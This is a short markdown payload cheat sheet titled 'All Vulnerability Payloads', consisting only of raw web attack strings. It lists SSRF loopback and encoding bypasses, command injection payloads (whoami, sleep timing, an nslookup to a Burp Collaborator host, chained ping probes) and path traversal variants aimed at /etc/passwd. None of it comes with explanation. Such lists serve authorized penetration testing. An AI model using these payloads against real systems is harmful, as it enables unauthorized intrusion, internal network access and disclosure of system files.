## All Vulnerability Payloads
```sh
# SSRF
http://localhost/
http://127.0.0.1/
http://127.1
http://2130706433
http://017700000001
http://[::]:80/
http://burpcollaborator.net
http://localhost/?%0A
http://127.0.0.1/?%0A
http://127.1/?%0A
http://2130706433/?%0A
http://017700000001/?%0A
http://[::]:80/?%0A
http://burpcollaborator.net/?%0A
# OS command Injection
;whoami;
;sleep+10;
nslookup+burpcollaborator.net
|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
# Path Traversal
../../../etc/passwd
..//..//..//..//etc/passwd
....//....//....//....//etc/passwd
/var/www/images/../../../etc/passwd
/var/www/images/..//..//..//..//etc/passwd
/var/www/images/....//....//....//....//etc/passwd
```
